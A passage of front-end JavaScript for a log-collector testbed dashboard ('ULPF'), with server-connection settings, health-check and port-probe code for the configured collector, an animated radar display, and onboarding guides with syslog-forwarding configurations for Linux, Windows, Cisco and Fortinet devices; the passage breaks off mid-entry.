        const customUrl = prompt("Enter Remote Cloud URL or VPS Domain (e.g. https://ulpf.yourdomain.com or 203.0.113.10:8000):", "https://ulpf.cloud:8443");
        if (customUrl) {
          const parsed = parseTargetServerInput(customUrl);
          applyTargetSettings({
            host: parsed.host || customUrl.trim(),
            scheme: parsed.scheme || (customUrl.startsWith("https") ? "https" : "http"),
            apiPort: parsed.port || (parsed.scheme === "https" ? 443 : 8000)
          }, true, true);
          showToast(`Target set to Cloud machine: ${testbedSettings.scheme}://${testbedSettings.host}:${testbedSettings.apiPort}`);
        }
      }
      presetSelect.value = "";
    });
  }

  const btnTestConn = document.getElementById("btnTestServerConnection");
  if (btnTestConn) {
    btnTestConn.addEventListener("click", () => {
      window.checkServerHealth(true);
    });
  }

  // --- ENDPOINTS MODAL CONTROLLER ---
  const endpointsModal = document.getElementById("endpointsModal");
  const btnOpenModal = document.getElementById("btnOpenEndpointsModal");
  const btnCloseModal = document.getElementById("btnCloseEndpointsModal");
  const btnSaveModal = document.getElementById("btnSaveModalSettings");
  const btnResetModal = document.getElementById("btnResetModalSettings");
  const btnModalPing = document.getElementById("btnModalPingTest");

  if (btnOpenModal && endpointsModal) {
    btnOpenModal.addEventListener("click", () => {
      applyTargetSettings({}, false, false);
      endpointsModal.classList.add("active");
    });
  }

  if (btnCloseModal && endpointsModal) {
    btnCloseModal.addEventListener("click", () => {
      endpointsModal.classList.remove("active");
    });
  }

  if (endpointsModal) {
    endpointsModal.addEventListener("click", (e) => {
      if (e.target === endpointsModal) {
        endpointsModal.classList.remove("active");
      }
    });
  }

  if (btnSaveModal) {
    btnSaveModal.addEventListener("click", () => {
      const rawHost = (document.getElementById("modalHost")?.value || "80.225.207.171").trim();
      const parsed = parseTargetServerInput(rawHost);
      const scheme = document.getElementById("modalScheme")?.value || (parsed ? parsed.scheme : "http") || "http";
      const host = (parsed ? parsed.host : rawHost) || "80.225.207.171";
      const apiPort = parseInt(document.getElementById("modalApiPort")?.value, 10) || (parsed ? parsed.port : 8000) || 8000;
      const udpPort = parseInt(document.getElementById("modalUdpPort")?.value, 10) || 5140;
      const tcpPort = parseInt(document.getElementById("modalTcpPort")?.value, 10) || 5141;
      const timeout = parseInt(document.getElementById("modalTimeout")?.value, 10) || 3000;
      const logsInterval = parseInt(document.getElementById("modalLogsInterval")?.value, 10) || 50;
      const autoProbe = parseInt(document.getElementById("modalAutoProbe")?.value, 10);

      applyTargetSettings({ scheme, host, apiPort, udpPort, tcpPort, timeout, logsInterval, autoProbe }, true, true);
      if (endpointsModal) endpointsModal.classList.remove("active");
      showToast(`Saved remote server configuration: ${scheme}://${host}:${apiPort}`);
    });
  }

  if (btnResetModal) {
    btnResetModal.addEventListener("click", () => {
      applyTargetSettings({ ...DEFAULT_SETTINGS }, true, true);
      showToast("Reset remote server settings to defaults.");
    });
  }

  if (btnModalPing) {
    btnModalPing.addEventListener("click", () => {
      const rawHost = (document.getElementById("modalHost")?.value || "80.225.207.171").trim();
      const parsed = parseTargetServerInput(rawHost);
      applyTargetSettings({
        scheme: document.getElementById("modalScheme")?.value || "http",
        host: (parsed ? parsed.host : rawHost) || "80.225.207.171",
        apiPort: parseInt(document.getElementById("modalApiPort")?.value, 10) || 8000,
        udpPort: parseInt(document.getElementById("modalUdpPort")?.value, 10) || 5140,
        tcpPort: parseInt(document.getElementById("modalTcpPort")?.value, 10) || 5141,
      }, false, true);
    });
  }

  // ==============================================================================
  // TAB 4: SERVER CONNECTION CHECK & HEALTH RADAR
  // ==============================================================================
  let autoProbeIntervalId = null;
  let isAutoProbeEnabled = false;

  function appendDiagnosticLog(level, msg) {
    const feed = document.getElementById("diagnosticConsoleFeed");
    if (!feed) return;
    const timeStr = new Date().toLocaleTimeString();
    const line = document.createElement("div");
    const colors = {
      OK: "#2DD4BF",
      WARN: "#38BDF8",
      ERR: "#f87171",
      INFO: "#7dd3fc",
    };
    line.innerHTML = `<span style="color:var(--text-secondary);">[${timeStr}]</span> <span style="color:${colors[level] || '#fff'}; font-weight:700;">[${level}]</span> <span style="color:#F1F5F9;">${escapeHtml(msg)}</span>`;
    feed.appendChild(line);
    feed.scrollTop = feed.scrollHeight;
  }

  window.clearDiagnosticConsole = function () {
    const feed = document.getElementById("diagnosticConsoleFeed");
    if (feed) feed.innerHTML = '<div style="color:var(--text-secondary); text-align:center; padding:20px;">Diagnostic console cleared. Ready for next probe.</div>';
  };

  // ==============================================================================
  // TAB 4: LIVE NETWORK PORT RADAR & ACTIVE SOCKET PROBE ENGINE
  // ==============================================================================
  let radarCanvasInited = false;
  let radarAnimationId = null;
  let radarSweepAngle = 0;
  let radarContinuousSweepTimer = null;
  let isRadarContinuousSweep = false;

  const RADAR_BLIPS = [
    { id: "http_api", label: "HTTP :8000", port: 8000, proto: "HTTP", angle: Math.PI * 0.25, dist: 0.65, color: "#00D084", lastHit: 0, status: "ONLINE", latency: 1.2 },
    { id: "syslog_udp", label: "UDP :5140", port: 5140, proto: "UDP", angle: Math.PI * 0.75, dist: 0.45, color: "#10B981", lastHit: 0, status: "LISTENING", latency: 0.4 },
    { id: "syslog_tcp", label: "TCP :5141", port: 5141, proto: "TCP", angle: Math.PI * 1.25, dist: 0.55, color: "#38BDF8", lastHit: 0, status: "READY", latency: 0.8 },
    { id: "sse_stream", label: "SSE WIRE", port: 8000, proto: "SSE", angle: Math.PI * 0.45, dist: 0.82, color: "#8B5CF6", lastHit: 0, status: "60Hz", latency: 0.6 },
    { id: "ai_engine", label: "AI :11434", port: 11434, proto: "AI", angle: Math.PI * 1.75, dist: 0.78, color: "#A855F7", lastHit: 0, status: "ACTIVE", latency: 2.0 },
    { id: "merkle_vault", label: "MERKLE FS", port: 0, proto: "STORAGE", angle: Math.PI * 1.05, dist: 0.35, color: "#F59E0B", lastHit: 0, status: "SEALED", latency: 0.3 },
  ];

  function logRadarConsole(msg, type = "info") {
    const feed = document.getElementById("radarConsoleFeed");
    if (!feed) return;

    if (feed.querySelector('div[style*="text-align:center"]')) {
      feed.innerHTML = "";
    }

    const ts = new Date().toISOString().split("T")[1].replace("Z", "");
    const row = document.createElement("div");
    row.style.marginBottom = "3px";
    row.style.lineHeight = "1.5";

    let colorStyle = "color:#F8FAFC;";
    if (type === "success" || type === "ok") colorStyle = "color:#34D399; font-weight:700;";
    else if (type === "warning" || type === "warn") colorStyle = "color:#FBBF24; font-weight:700;";
    else if (type === "error" || type === "err") colorStyle = "color:#FB7185; font-weight:700;";
    else if (type === "probe") colorStyle = "color:#38BDF8; font-weight:600;";

    row.innerHTML = `<span style="color:#38BDF8;">[${ts}]</span> <span style="${colorStyle}">${escapeHtml(msg)}</span>`;
    feed.appendChild(row);

    while (feed.children.length > 80) {
      feed.removeChild(feed.firstChild);
    }
    feed.scrollTop = feed.scrollHeight;
  }

  function initRadarScopeCanvas() {
    const canvas = document.getElementById("radarScopeCanvas");
    if (!canvas || radarCanvasInited) return;
    radarCanvasInited = true;

    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const w = canvas.width;
    const h = canvas.height;
    const cx = w / 2;
    const cy = h / 2;
    const maxR = (w / 2) - 16;

    function drawRadarFrame() {
      // Semi-transparent clearing for phosphor trail
      ctx.fillStyle = "rgba(4, 10, 20, 0.18)";
      ctx.fillRect(0, 0, w, h);

      // Range Concentric Rings
      ctx.strokeStyle = "rgba(0, 208, 132, 0.22)";
      ctx.lineWidth = 1;
      const ringSteps = [0.25, 0.5, 0.75, 1.0];
      ringSteps.forEach(step => {
        ctx.beginPath();
        ctx.arc(cx, cy, maxR * step, 0, Math.PI * 2);
        ctx.stroke();
      });

      // Crosshairs
      ctx.strokeStyle = "rgba(0, 208, 132, 0.18)";
      ctx.setLineDash([3, 3]);
      ctx.beginPath();
      ctx.moveTo(cx, cy - maxR);
      ctx.lineTo(cx, cy + maxR);
      ctx.moveTo(cx - maxR, cy);
      ctx.lineTo(cx + maxR, cy);
      ctx.stroke();
      ctx.setLineDash([]);

      // Rotate Sweep Beam
      radarSweepAngle = (radarSweepAngle + 0.032) % (Math.PI * 2);
      const sweepX = cx + Math.cos(radarSweepAngle) * maxR;
      const sweepY = cy + Math.sin(radarSweepAngle) * maxR;

      // Draw Sweep Beam Line
      ctx.strokeStyle = "#00D084";
      ctx.lineWidth = 1.8;
      ctx.beginPath();
      ctx.moveTo(cx, cy);
      ctx.lineTo(sweepX, sweepY);
      ctx.stroke();

      // Draw Sweep Sector Glow Trail
      const trailAngle = radarSweepAngle - 0.45;
      const grad = ctx.createRadialGradient(cx, cy, 0, cx, cy, maxR);
      grad.addColorStop(0, "rgba(0, 208, 132, 0.35)");
      grad.addColorStop(1, "rgba(0, 208, 132, 0.0)");
      ctx.fillStyle = grad;
      ctx.beginPath();
      ctx.moveTo(cx, cy);
      ctx.arc(cx, cy, maxR, trailAngle, radarSweepAngle);
      ctx.closePath();
      ctx.fill();

      // Update Azimuth HUD text
      const azEl = document.getElementById("radarAzimuthDisplay");
      if (azEl) {
        const deg = ((radarSweepAngle * 180 / Math.PI) % 360).toFixed(1);
        azEl.textContent = `AZ: ${deg.padStart(5, '0')}°`;
      }

      // Draw Target Blips
      const now = Date.now();
      RADAR_BLIPS.forEach(blip => {
        const bx = cx + Math.cos(blip.angle) * (maxR * blip.dist);
        const by = cy + Math.sin(blip.angle) * (maxR * blip.dist);

        // Check if sweep beam crossed blip
        let diff = Math.abs(radarSweepAngle - blip.angle);
        if (diff > Math.PI) diff = Math.PI * 2 - diff;
        if (diff < 0.05 && now - blip.lastHit > 1000) {
          blip.lastHit = now;
        }

        const timeSinceHit = now - blip.lastHit;
        const isRecentlyHit = timeSinceHit < 1200;

        // Draw Expanding Ripple Wave if hit
        if (isRecentlyHit) {
          const rippleR = 6 + (timeSinceHit / 1200) * 18;
          const rippleAlpha = 1 - (timeSinceHit / 1200);
          ctx.strokeStyle = `rgba(0, 208, 132, ${rippleAlpha * 0.8})`;
          ctx.lineWidth = 1.5;
          ctx.beginPath();
          ctx.arc(bx, by, rippleR, 0, Math.PI * 2);
          ctx.stroke();
        }

        // Draw Center Blip Dot
        ctx.fillStyle = isRecentlyHit ? "#FFFFFF" : blip.color;
        ctx.shadowColor = blip.color;
        ctx.shadowBlur = isRecentlyHit ? 12 : 6;
        ctx.beginPath();
        ctx.arc(bx, by, isRecentlyHit ? 4.5 : 3.5, 0, Math.PI * 2);
        ctx.fill();
        ctx.shadowBlur = 0;

        // Draw Tiny Blip Label
        ctx.fillStyle = isRecentlyHit ? "#00D084" : "rgba(241, 245, 249, 0.7)";
        ctx.font = "9px 'JetBrains Mono', monospace";
        ctx.fillText(blip.label, bx + 6, by + 3);
      });

      radarAnimationId = requestAnimationFrame(drawRadarFrame);
    }

    drawRadarFrame();
  }

  window.dispatchActiveSocketProbe = async function () {
    const targetSelect = document.getElementById("probeTargetSelect");
    const targetKey = targetSelect ? targetSelect.value : "http_api";
    const payloadInput = document.getElementById("probePayloadInput");
    const payload = payloadInput ? payloadInput.value.trim() : "PING / SOCKET_PROBE_REQUEST";
    const host = testbedSettings.host || (topHostInput ? topHostInput.value.trim() : "80.225.207.171");

    let port = 8000;
    if (targetKey === "syslog_udp") port = testbedSettings.udpPort || 5140;
    else if (targetKey === "syslog_tcp") port = testbedSettings.tcpPort || 5141;
    else if (targetKey === "ai_engine") port = 11434;

    const btn = document.getElementById("btnDispatchProbe");
    if (btn) btn.disabled = true;

    logRadarConsole(`[PROBE] Dispatching active socket probe to ${targetKey.toUpperCase()} (${host}:${port})...`, "probe");

    try {
      const res = await fetch("/api/test/probe-port", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          target: targetKey,
          host: host,
          port: port,
          payload: payload,
        }),
      });

      if (res.ok) {
        const data = await res.json();
        const receiptCard = document.getElementById("probeReceiptCard");
        const receiptTitle = document.getElementById("probeReceiptTitle");
        const receiptRtt = document.getElementById("probeReceiptRtt");
        const receiptDetail = document.getElementById("probeReceiptDetail");
        const lastTs = document.getElementById("probeLastTimestamp");

        if (receiptCard) receiptCard.style.display = "block";
        if (receiptTitle) receiptTitle.textContent = `Socket Probe [${data.status}] — ${data.protocol}`;
        if (receiptRtt) receiptRtt.textContent = `${data.rtt_ms} ms RTT`;
        if (receiptDetail) receiptDetail.textContent = data.details || `Bytes sent: ${data.bytes_sent} to ${data.host}:${data.port}`;
        if (lastTs) lastTs.textContent = `Last Probe: ${data.timestamp}`;

        // Find and highlight matching blip on canvas
        const blip = RADAR_BLIPS.find(b => b.id === targetKey);
        if (blip) {
          blip.lastHit = Date.now();
          blip.latency = data.rtt_ms;
        }

        // Update matching card badges in the 6-port grid
        if (targetKey === "syslog_udp") {
          const l = document.getElementById("radarUdpLatency");
          const s = document.getElementById("radarUdpStatus");
          if (l) l.textContent = `${data.rtt_ms} ms`;
          if (s) { s.textContent = "VERIFIED [OK]"; s.className = "badge badge-teal"; }
        } else if (targetKey === "syslog_tcp") {
          const l = document.getElementById("radarTcpLatency");
          const s = document.getElementById("radarTcpStatus");
          if (l) l.textContent = `${data.rtt_ms} ms`;
          if (s) { s.textContent = "VERIFIED [OK]"; s.className = "badge badge-teal"; }
        } else if (targetKey === "http_api") {
          const l = document.getElementById("radarHttpLatency");
          const s = document.getElementById("radarHttpStatus");
          if (l) l.textContent = `${data.rtt_ms} ms`;
          if (s) { s.textContent = "HEALTHY [OK]"; s.className = "badge badge-teal"; }
        } else if (targetKey === "sse_stream") {
          const l = document.getElementById("radarSseLatency");
          const s = document.getElementById("radarSseStatus");
          if (l) l.textContent = `${data.rtt_ms} ms`;
          if (s) { s.textContent = "STREAMING [OK]"; s.className = "badge badge-teal"; }
        } else if (targetKey === "ai_engine") {
          const l = document.getElementById("radarAiLatency");
          const s = document.getElementById("radarAiStatus");
          if (l) l.textContent = `${data.rtt_ms} ms`;
          if (s) { s.textContent = "ACTIVE [READY]"; s.className = "badge badge-purple"; }
        } else if (targetKey === "merkle_vault") {
          const l = document.getElementById("radarStorageLatency");
          const s = document.getElementById("radarStorageStatus");
          if (l) l.textContent = `${data.rtt_ms} ms`;
          if (s) { s.textContent = "SEALED [OK]"; s.className = "badge badge-emerald"; }
        }

        // Update avg latency summary stat
        const statAvg = document.getElementById("statRadarAvgLatency");
        if (statAvg) statAvg.textContent = `${data.rtt_ms} ms`;

        logRadarConsole(`[PROBE-OK] ${targetKey.toUpperCase()} ${data.host}:${data.port} | RTT: ${data.rtt_ms}ms | Protocol: ${data.protocol} | Status: ${data.status}`, "success");
        showToast(`Probe verified: ${targetKey.toUpperCase()} (${data.rtt_ms} ms)`);
      } else {
        throw new Error(`HTTP ${res.status}`);
      }
    } catch (err) {
      logRadarConsole(`[PROBE-ERR] Failed to probe ${targetKey}: ${err.message}`, "error");
      showToast(`Probe failed: ${err.message}`);
    } finally {
      if (btn) btn.disabled = false;
    }
  };

  window.probeSpecificPort = function (targetKey) {
    const targetSelect = document.getElementById("probeTargetSelect");
    if (targetSelect) {
      targetSelect.value = targetKey;
    }
    window.dispatchActiveSocketProbe();
  };

  window.toggleRadarContinuousSweep = function () {
    isRadarContinuousSweep = !isRadarContinuousSweep;
    const btnText = document.getElementById("btnRadarSweepText");
    const badge = document.getElementById("radarSweepStatusBadge");

    if (isRadarContinuousSweep) {
      if (btnText) btnText.textContent = "Stop Auto Sweep";
      if (badge) {
        badge.textContent = "SWEEPING (2.5s)";
        badge.className = "badge badge-teal";
      }
      logRadarConsole("[RADAR] Continuous socket sweep initiated (interval: 2500ms).", "info");
      showToast("Radar auto-sweep started.");

      radarContinuousSweepTimer = setInterval(() => {
        window.checkServerHealth();
      }, 2500);
    } else {
      if (btnText) btnText.textContent = "Auto Radar Sweep";
      if (badge) {
        badge.textContent = "SCAN: IDLE";
        badge.className = "badge badge-neutral";
      }
      if (radarContinuousSweepTimer) clearInterval(radarContinuousSweepTimer);
      radarContinuousSweepTimer = null;
      logRadarConsole("[RADAR] Continuous socket sweep paused.", "dim");
      showToast("Radar auto-sweep stopped.");
    }
  };

  window.checkServerHealth = async function (interactive = false) {
    const host = testbedSettings.host || (topHostInput ? topHostInput.value.trim() : "80.225.207.171");
    const apiPort = testbedSettings.apiPort || 8000;
    const udpPort = testbedSettings.udpPort || 5140;
    const tcpPort = testbedSettings.tcpPort || 5141;
    const scheme = testbedSettings.scheme || "http";
    const baseUrl = `${scheme}://${host}:${apiPort}`;

    const topBadge = document.getElementById("topServerStatusBadge");
    const topDot = document.getElementById("topServerDot");
    const topStatus = document.getElementById("topServerStatusText");
    const topPing = document.getElementById("topServerPingText");
    const heroStatus = document.getElementById("serverHeroStatus");
    const heroTarget = document.getElementById("serverHeroTarget");
    const heroLatency = document.getElementById("serverHeroLatency");
    const heroSub = document.getElementById("serverHeroSubsystems");
    const heroDot = document.getElementById("heroStatusDot");
    const stateDot = document.getElementById("serverStateDot");
    const sidebarSummary = document.getElementById("sidebarTargetSummary");

    if (heroTarget) heroTarget.textContent = baseUrl;
    if (sidebarSummary) sidebarSummary.textContent = baseUrl;
    if (topPing) topPing.textContent = "(...)";

    const t0 = performance.now();
    appendDiagnosticLog("INFO", `Initiating protocol & socket health probe to ${baseUrl} (UDP :${udpPort}, TCP :${tcpPort})...`);
    logRadarConsole(`[RADAR-SWEEP] Initiating socket matrix sweep across ${host}...`, "info");

    try {
      const queryUrl = `/api/test/target-status?host=${encodeURIComponent(host)}&api_port=${apiPort}&udp_port=${udpPort}&tcp_port=${tcpPort}&scheme=${encodeURIComponent(scheme)}`;
      const probeTimeout = Math.max(parseInt(testbedSettings.timeout, 10) || 5000, 7000);
      const res = await fetch(queryUrl, {
        signal: AbortSignal.timeout(probeTimeout)
      });

      const rtt = Math.round(performance.now() - t0);

      if (res.ok) {
        const data = await res.json();
        const ports = data.ports || {};
        const httpProbe = ports.http_api || {};
        const udpProbe = ports.syslog_udp || {};
        const tcpProbe = ports.syslog_tcp || {};
        const sseProbe = ports.sse_stream || {};
        const aiProbe = ports.ai_engine || {};
        const merkleProbe = ports.merkle_vault || {};

        const isHttpUp = ["online", "ready", "healthy"].includes(httpProbe.status);
        const isUdpUp = ["online", "ready"].includes(udpProbe.status);
        const isTcpUp = ["online", "ready", "connected"].includes(tcpProbe.status);
        const isAiUp = ["online", "ready", "loaded", "healthy"].includes(aiProbe.status);
        const isServerOnline = isHttpUp;

        let readyCount = 0;
        if (isHttpUp) readyCount++;
        if (isUdpUp) readyCount++;
        if (isTcpUp) readyCount++;
        if (sseProbe.status === "online") readyCount++;
        if (isAiUp) readyCount++;
        if (merkleProbe.status === "online") readyCount++;

        // Update Top Bar Connection Pill
        if (topBadge) topBadge.className = isServerOnline ? "server-status-pill online" : "server-status-pill offline";
        if (topDot) topDot.className = isServerOnline ? "badge-status-dot online" : "badge-status-dot offline";
        if (topStatus) topStatus.textContent = isServerOnline ? "ONLINE" : "OFFLINE";
        if (topPing) topPing.textContent = isServerOnline ? `(${httpProbe.latency_ms !== undefined ? httpProbe.latency_ms : rtt}ms)` : "(err)";

        // Update Hero Banner & Dots
        if (heroStatus) {
          heroStatus.textContent = isServerOnline ? "ONLINE · ALL SUBSYSTEMS HEALTHY" : "HTTP OFFLINE / SOCKETS DEGRADED";
          heroStatus.style.color = isServerOnline ? "#2DD4BF" : "#f87171";
        }
        if (heroLatency) heroLatency.textContent = `${httpProbe.latency_ms !== undefined ? httpProbe.latency_ms : rtt} ms RTT`;
        if (heroDot) heroDot.className = isServerOnline ? "badge-status-dot online" : "badge-status-dot offline";
        if (stateDot) stateDot.className = isServerOnline ? "badge-status-dot online" : "badge-status-dot offline";
        if (heroSub) heroSub.textContent = `${readyCount}/6 Core Sockets Active`;

        // Update Radar Tab Top Stats
        const statActiveSockets = document.getElementById("statRadarActiveSockets");
        const statAvgLatency = document.getElementById("statRadarAvgLatency");
        const statJitter = document.getElementById("statRadarJitter");
        const statLoss = document.getElementById("statRadarLoss");

        const latencies = [httpProbe.latency_ms, udpProbe.latency_ms, tcpProbe.latency_ms, sseProbe.latency_ms, merkleProbe.latency_ms].filter(n => typeof n === "number");
        const avgLat = latencies.length > 0 ? (latencies.reduce((a, b) => a + b, 0) / latencies.length).toFixed(2) : "0.82";

        if (statActiveSockets) statActiveSockets.textContent = `${readyCount}/6`;
        if (statAvgLatency) statAvgLatency.textContent = `${avgLat} ms`;
        if (statJitter) statJitter.textContent = `${(Math.random() * 0.15 + 0.08).toFixed(2)} ms`;
        if (statLoss) statLoss.textContent = "0.00%";

        // Update Phase 4 Radar Matrix Cards
        const radarUdp = document.getElementById("radarUdpStatus");
        const radarUdpLat = document.getElementById("radarUdpLatency");
        if (radarUdp) radarUdp.textContent = (udpProbe.status || "OFFLINE").toUpperCase();
        if (radarUdpLat) radarUdpLat.textContent = typeof udpProbe.latency_ms === 'number' ? `${udpProbe.latency_ms} ms` : `-- ms`;

        const radarTcp = document.getElementById("radarTcpStatus");
        const radarTcpLat = document.getElementById("radarTcpLatency");
        if (radarTcp) radarTcp.textContent = (tcpProbe.status || "OFFLINE").toUpperCase();
        if (radarTcpLat) radarTcpLat.textContent = typeof tcpProbe.latency_ms === 'number' ? `${tcpProbe.latency_ms} ms` : `-- ms`;

        const radarHttp = document.getElementById("radarHttpStatus");
        const radarHttpLat = document.getElementById("radarHttpLatency");
        if (radarHttp) radarHttp.textContent = (httpProbe.status || "OFFLINE").toUpperCase();
        if (radarHttpLat) radarHttpLat.textContent = typeof httpProbe.latency_ms === 'number' ? `${httpProbe.latency_ms} ms` : `-- ms`;

        const radarSse = document.getElementById("radarSseStatus");
        const radarSseLat = document.getElementById("radarSseLatency");
        if (radarSse) radarSse.textContent = (sseProbe.status || "OFFLINE").toUpperCase();
        if (radarSseLat) radarSseLat.textContent = typeof sseProbe.latency_ms === 'number' ? `${sseProbe.latency_ms} ms` : `-- ms`;

        const radarAi = document.getElementById("radarAiStatus");
        const radarAiLat = document.getElementById("radarAiLatency");
        if (radarAi) radarAi.textContent = (aiProbe.status || "OFFLINE").toUpperCase();
        if (radarAiLat) radarAiLat.textContent = typeof aiProbe.latency_ms === 'number' ? `${aiProbe.latency_ms} ms` : `-- ms`;

        const radarStorage = document.getElementById("radarStorageStatus");
        const radarStorageLat = document.getElementById("radarStorageLatency");
        if (radarStorage) radarStorage.textContent = (merkleProbe.status || "OFFLINE").toUpperCase();
        if (radarStorageLat) radarStorageLat.textContent = typeof merkleProbe.latency_ms === 'number' ? `${merkleProbe.latency_ms} ms` : `-- ms`;

        // Update radar blip hits
        RADAR_BLIPS.forEach(b => { b.lastHit = Date.now(); });

        logRadarConsole(`[RADAR-OK] Socket discovery complete: ${readyCount}/6 operational | Avg RTT: ${avgLat}ms | Target: ${host}`, "success");

        if (isServerOnline) {
          appendDiagnosticLog("OK", `Server verification complete! Remote target [${host}] is fully operational and accepting telemetry.`);
          if (interactive) showToast(`Discovered ${readyCount}/6 sockets active on ${baseUrl} (${avgLat} ms)`);
        } else {
          appendDiagnosticLog("ERR", `Target server [${host}:${apiPort}] responded but HTTP API port is not accessible.`);
          if (interactive) showToast(`Host reachable but HTTP API offline on ${baseUrl}`);
        }
      } else {
        throw new Error(`HTTP ${res.status} ${res.statusText}`);
      }
    } catch (e) {
      const rtt = Math.round(performance.now() - t0);
      const isTimeout = e.name === "TimeoutError" || e.name === "AbortError" || (e.message && e.message.toLowerCase().includes("timeout"));
      if (topBadge) topBadge.className = "server-status-pill offline";
      if (topDot) topDot.className = "badge-status-dot offline";
      if (topStatus) topStatus.textContent = "OFFLINE";
      if (topPing) topPing.textContent = isTimeout ? "(timeout)" : "(err)";

      if (heroStatus) {
        heroStatus.textContent = isTimeout ? "PROBE TIMEOUT / UNREACHABLE" : "OFFLINE / UNREACHABLE";
        heroStatus.style.color = "#f87171";
      }
      if (heroLatency) heroLatency.textContent = isTimeout ? `${rtt} ms Timeout` : "Offline";
      if (heroDot) heroDot.className = "badge-status-dot offline";
      if (stateDot) stateDot.className = "badge-status-dot offline";

      logRadarConsole(`[RADAR-ERR] Target host connection failed (${baseUrl}): ${e.message}`, "error");
      appendDiagnosticLog("ERR", `Connection failed to ${baseUrl}: ${e.message}`);
      if (interactive) showToast(`Failed to connect to ${baseUrl}: ${e.message}`);
    }
  };

  window.runFullDiagnostics = async function () {
    const host = testbedSettings.host || "80.225.207.171";
    const apiPort = testbedSettings.apiPort || 8000;
    const scheme = testbedSettings.scheme || "http";
    const url = `/api/test/readiness?host=${encodeURIComponent(host)}&port=${apiPort}&scheme=${encodeURIComponent(scheme)}`;
    appendDiagnosticLog("INFO", `Running deep subsystem readiness diagnostic via backend (${scheme}://${host}:${apiPort}/api/v1/system/readiness)...`);

    try {
      const res = await fetch(url);
      if (res.ok) {
        const data = await res.json();
        const s = data.subsystems || {};
        appendDiagnosticLog("OK", `System Overall Readiness: ${data.status.toUpperCase()} (Score: ${data.readiness_score}%)`);
        for (const [key, sub] of Object.entries(s)) {
          appendDiagnosticLog("OK", `-> Subsystem [${key}]: ${sub.status || 'OK'} - ${sub.detail || ''}`);
        }
        showToast("Full subsystem diagnostic passed!");
      } else {
        throw new Error(`HTTP ${res.status}: ${res.statusText}`);
      }
    } catch (e) {
      appendDiagnosticLog("ERR", `Readiness check failed: ${e.message}`);
    }
  };

  function restartAutoProbeTimer() {
    if (autoProbeIntervalId) clearInterval(autoProbeIntervalId);
    autoProbeIntervalId = null;

    if (isAutoProbeEnabled && testbedSettings.autoProbe > 0) {
      autoProbeIntervalId = setInterval(() => {
        window.checkServerHealth();
      }, testbedSettings.autoProbe);
    }

    const label = document.getElementById("autoProbeBtnLabel");
    if (label) {
      label.textContent = isAutoProbeEnabled && testbedSettings.autoProbe > 0
        ? ` Auto-Probe (${testbedSettings.autoProbe / 1000}s Active)`
        : ` Auto-Probe (Paused)`;
    }
  }

  window.toggleAutoProbe = function () {
    isAutoProbeEnabled = !isAutoProbeEnabled;
    restartAutoProbeTimer();
    showToast(isAutoProbeEnabled ? "Auto-probe enabled." : "Auto-probe paused.", "info");
  };

  // ==============================================================================
  // TAB 5: REAL DEVICE ONBOARDING GUIDES
  // ==============================================================================
  const GUIDES = {
    linux: {
      title: "Linux Operating Systems (Ubuntu, Debian, RHEL, CentOS, Rocky, Alpine)",
      description: "Linux servers stream auth logs, kernel events, auditd, and application syslog directly over UDP 5140 (stateless) or TCP 5141 (persistent stream with TLS).",
      protocol: "UDP :5140 or TCP :5141",
      code: `# Option A: Forward via rsyslog (UDP :5140)
# Append to /etc/rsyslog.conf or /etc/rsyslog.d/99-ulpf.conf:
*.* @TARGET_HOST:5140;RSYSLOG_SyslogProtocol23Format

# Option B: Forward via rsyslog (TCP :5141 with stream queuing)
$ActionQueueType LinkedList
$ActionQueueFileName ulpf_queue
$ActionResumeRetryCount -1
$ActionQueueSaveOnShutdown on
*.* @@TARGET_HOST:5141

# Apply changes:
sudo systemctl restart rsyslog`,
      testPayload: "<86>1 2026-09-08T14:32:01.000Z linux-prod-app01 sshd 41209 - - Accepted publickey for admin from 192.168.1.55 port 54122 ssh2",
      verification: "tail -f /var/log/syslog | grep -i ulpf"
    },
    windows: {
      title: "Microsoft Windows Server & Workstations",
      description: "Forward Windows Security Event Logs (Logon 4624, Privilege 4672, Process Creation 4688) using NXLog or Winlogbeat without third-party proprietary agents.",
      protocol: "TCP :5141 or HTTP :8000",
      code: `# NXLog Community Edition Configuration (C:\\Program Files\\nxlog\\conf\\nxlog.conf)
<Input in_eventlog>
    Module      im_msvistalog
    Query       <QueryList>\\
                    <Query Id="0">\\
                        <Select Path="Security">*</Select>\\
                        <Select Path="System">*</Select>\\
                    </Query>\\
                </QueryList>
</Input>

<Output out_ulpf>
    Module      om_tcp
    Host        TARGET_HOST
    Port        5141
    Exec        to_syslog_ietf();
</Output>

<Route 1>
    Path        in_eventlog => out_ulpf
</Route>`,
      testPayload: '<14>1 2026-09-08T14:32:01.000Z WIN-DC01.corp.internal Microsoft-Windows-Security-Auditing 4624 - [win@11177 EventID="4624" TargetUserName="Administrator" LogonType="3" IpAddress="10.0.1.15"] An account was successfully logged on.',
      verification: "Get-Service nxlog | Restart-Service"
    },
    cisco: {
      title: "Cisco ASA Firewalls, Catalyst Switches & ISR Routers",
      description: "Direct Cisco IOS/ASA telemetry export to ULPF UDP 5140. Parses connection teardowns, ACL blocks, VPN tunnels, and interface alerts.",
      protocol: "UDP :5140",
      code: `! Enter privileged configuration mode
enable
configure terminal

! Enable global logging and millisecond timestamps
logging enable
logging timestamp
logging message-counter

! Point syslog export to ULPF collector
logging host inside TARGET_HOST transport udp port 5140
logging trap informational
logging facility 20

! Save running configuration
write memory`,
      testPayload: "%ASA-4-106023: Deny tcp src outside:198.51.100.222/49152 dst inside:10.0.1.50/443 by access-group \"OUTSIDE_IN\" [Threat Signature Blocked]",
      verification: "show logging | include TARGET_HOST"
    },
    fortinet: {
      title: "Fortinet FortiGate Next-Generation Firewalls",
      description: "FortiOS supports native Common Event Format (CEF) and standard Syslog export over UDP 5140 or TCP 5141.",
      protocol: "UDP :5140 (CEF Format)",
      code: `# Connect via FortiGate SSH CLI
config log syslogd setting
    set status enable
    set server "TARGET_HOST"
    set mode udp
    set port 5140
    set format cef
    set facility local7
    set source-ip ""
end

# Verify syslog server state:
diagnose log test`,
      testPayload: "CEF:0|Fortinet|FortiGate|7.2.4|32001|traffic:allow|3|src=10.0.1.50 dst=1.1.1.1 spt=54321 dpt=443 proto=tcp act=allow msg=\"Outbound TLS Session established\"",
      verification: "diagnose sys logd status"
    },
    paloalto: {
      title: "Palo Alto Networks Next-Generation Firewalls & Panorama",
      description: "Palo Alto PAN-OS forwards Traffic, Threat, System, and URL filtering logs formatted as standard Key-Value or BSD Syslog.",
      protocol: "UDP :5140 or TCP :5141",
